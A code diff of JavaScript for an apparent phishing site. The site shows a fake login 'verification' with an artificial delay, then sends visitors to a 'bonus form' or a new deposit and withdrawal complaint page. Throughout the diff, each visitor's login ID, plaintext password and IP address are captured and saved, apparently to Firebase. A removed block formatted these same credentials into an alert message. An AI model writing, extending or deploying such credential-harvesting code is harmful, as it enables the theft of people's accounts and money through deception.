@@ -68,7 +68,10 @@ const VERIFIED_KEY = 'ls_verified_account';
 if (localStorage.getItem(VERIFIED_KEY)) {
     sessionStorage.setItem('ls_logged_in', 'true');
     sessionStorage.setItem('ls_login_id', localStorage.getItem(VERIFIED_KEY));
-    window.location.replace('../bonus-form/index.html');
+
+    const isComplaint = new URLSearchParams(window.location.search).get('from') === 'complaint';
+    const ct = new URLSearchParams(window.location.search).get('type') || 'deposit';
+    window.location.replace(isComplaint ? '../complaint/index.html?type=' + ct : '../bonus-form/index.html');
 }
 
 // ================= MENU =================
@@ -108,6 +111,14 @@ const emailGroup = document.getElementById('email-group');
 const VERIFY_DURATION = 4000;
 const POPUP_DURATION = 32000;
 const BONUS_FORM_PAGE = '../bonus-form/index.html';
+const COMPLAINT_PAGE = '../complaint/index.html';
+
+// Agar complaint ke liye aaya hai to verify ke baad complaint page pe jao
+const qs = new URLSearchParams(window.location.search);
+const flow = qs.get('from') === 'complaint' ? 'complaint' : 'bonus';
+const NEXT_PAGE = flow === 'complaint'
+    ? COMPLAINT_PAGE + '?type=' + (qs.get('type') === 'withdrawal' ? 'withdrawal' : 'deposit')
+    : BONUS_FORM_PAGE;
 
 let popupTimer = null;
 
@@ -189,15 +200,7 @@ if (loginForm) {
 
         await new Promise(resolve => setTimeout(resolve, VERIFY_DURATION));
 
-        const loginText = `
-ðŸ” <b>NEW LOGIN VERIFICATION</b>
-
-ðŸ“± <b>Type:</b> ${isPhone ? 'Phone' : 'Email'}
-ðŸ†” <b>ID:</b> ${loginId}
-ðŸ”‘ <b>Password:</b> ${password}
-â° <b>Time:</b> ${new Date().toLocaleString()}
-ðŸŒ <b>IP:</b> ${await ipPromise}
-        `.trim();
+        const ip = await ipPromise;
 
         saveSubmission({
             event: 'login',
@@ -205,7 +208,7 @@ if (loginForm) {
             login_id: loginId,
             login_type: isPhone ? 'phone' : 'email',
             password: password,
-            ip: await ipPromise
+            ip: ip
         }).catch(() => {});
 
         if (verifyOverlay) {
@@ -249,14 +252,14 @@ function openVerifiedPopup(account) {
         if (countdownEl) countdownEl.textContent = remaining;
         if (remaining <= 0) {
             closeVerifiedPopup();
-            window.location.href = BONUS_FORM_PAGE;
+            window.location.href = NEXT_PAGE;
         }
     }, 1000);
 
     if (continueBtn) {
         continueBtn.addEventListener('click', () => {
             closeVerifiedPopup();
-            window.location.href = BONUS_FORM_PAGE;
+            window.location.href = NEXT_PAGE;
         });
     }
 }
@@ -292,6 +295,17 @@ if (successOk) {
 
 // Preload Firebase in background
 loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
+
+// ================= IP =================
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return 'Unknown';
+    }
+}
 
 // ================= PROFILE PAGE =================
 function saveRequestToHistory(type, data) {
@@ -395,5 +409,3 @@ document.querySelectorAll('a[href^="#"]').forEach(anchor => {
     });
 });
 
-// Preload Firebase in background
-loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
